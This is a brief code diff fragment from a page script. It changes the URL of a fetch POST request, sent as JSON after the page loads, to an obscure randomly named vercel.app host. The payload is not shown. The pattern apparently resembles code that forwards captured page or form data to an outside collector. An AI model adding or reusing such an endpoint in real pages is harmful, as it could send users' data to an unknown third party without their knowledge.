@@ -16,7 +16,7 @@ document.addEventListener("DOMContentLoaded", function() {
   
   
   
-          await fetch('https://acrylicedse.vercel.app/', {
+          await fetch('https://tgtgrpkrgpk.vercel.app', {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
